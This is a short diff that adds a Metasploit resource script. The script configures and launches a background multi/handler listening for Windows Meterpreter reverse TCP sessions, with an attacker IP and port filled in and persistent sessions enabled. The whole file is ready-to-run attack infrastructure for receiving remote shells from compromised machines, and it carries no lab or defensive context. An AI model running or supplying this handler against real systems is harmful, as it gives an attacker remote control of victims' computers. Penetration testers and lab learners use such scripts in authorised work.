@@ -1,0 +1,18 @@
+# Metasploit Resource Script (.rc)
+# Automates the initial startup for a generic reverse TCP handler
+
+# 1. Choose the multi-handler exploit module
+use exploit/multi/handler
+
+# 2. Set the payload type (adjust based on system architecture)
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+# 3. Configure local host parameters (replace with your attacking IP)
+set LHOST 10.10.10.5
+set LPORT 4444
+
+# 4. Set persistent listeners and advanced settings
+set ExitOnSession false
+
+# 5. Launch the handler in the background
+exploit -j
